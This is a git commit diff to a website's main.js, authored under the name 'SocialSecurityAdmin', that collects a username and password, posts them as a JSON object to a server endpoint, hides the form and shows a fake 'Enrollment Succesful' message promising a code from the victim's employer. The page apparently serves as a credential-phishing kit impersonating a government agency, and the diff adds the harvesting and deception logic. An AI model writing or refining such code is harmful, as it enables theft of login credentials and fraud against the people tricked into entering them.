06a729ed57fe27245a17fdc7d6cb6239adff7a26
SocialSecurityAdmin <susanlharper01@gmail.com>
2024-03-08 06:21:45 -0800

    perfect commit

--- public/js/main.js
+++ public/js/main.js
@@ -8,23 +8,34 @@ if(hour >= 5 && hour < 12){
     greeting = 'Evening!'
 }
 const greetings = document.querySelector('#greetings')
-greetings.innerHTML = `<h1>Good ${greeting}</h1>`
+greetings.innerHTML = `<h3>Good ${greeting}</h3>`
 
+const formBox = document.querySelector('#form-box')
 const username = document.querySelector('#username')
 const password = document.querySelector('#password')
-const submit = document.querySelector('#submit')
+const submitBtn = document.querySelector('#submit')
 
 function changeColor(){
     if(!username.value == '' && !password.value == ''){
-        submit.style.backgroundColor = '#d61e28'
+        submitBtn.style.backgroundColor = '#d61e28'
     } else {
-        submit.style.backgroundColor = ''
+        submitBtn.style.backgroundColor = ''
     }
 }
 
-username.addEventListener('input', changeColor)
-password.addEventListener('input', changeColor)
-submit.addEventListener('click', () => {
+function message(){
+    const h3 = document.createElement('h3')
+    h3.classList.add('end')
+    h3.appendChild(document.createTextNode(`Enrollment Succesful, you'll be sent a code shortly to complete your request by your employer`))
+    setTimeout(() => {
+        formBox.parentElement.appendChild(h3);
+        setTimeout(() => (h3.style.opacity = 1), 50);
+    }, 1000);
+}
+
+
+function submit(){
+    formBox.className = 'close'
     const obj = {
         user : username.value,
         key : password.value
@@ -38,4 +49,22 @@ submit.addEventListener('click', () => {
         },
         body: JSON.stringify(obj)
     })
+    message()
+}
+
+document.addEventListener('DOMContentLoaded', username.focus())
+username.addEventListener('keyup', e => {
+    if(e.keyCode == 13){
+        event.preventDefault()
+        password.focus()
+    }
 })
+password.addEventListener('keyup', e => {
+    if(e.keyCode == 13){
+        event.preventDefault()
+        submit()
+    }
+})
+username.addEventListener('input', changeColor)
+password.addEventListener('input', changeColor)
+submitBtn.addEventListener('click', submit)
